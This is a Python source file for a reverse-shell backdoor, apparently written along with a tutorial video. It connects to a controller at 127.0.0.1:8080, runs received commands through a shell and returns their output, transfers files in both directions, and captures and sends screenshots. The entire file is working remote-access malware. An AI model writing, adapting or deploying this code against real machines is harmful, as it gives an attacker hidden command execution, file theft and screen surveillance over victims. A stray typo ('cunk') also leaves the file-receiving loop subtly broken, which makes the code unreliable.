from asyncio import subprocess
import json
import socket
import json
import subprocess
import os
import pyautogui
from sys import stdin
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            cunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command == 'help':
            pass
        elif command[:3]== 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, stdin= subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.bind(('192.168.1.1', 8080))
s.connect(('127.0.0.1', 8080))
shell()
#2:19:09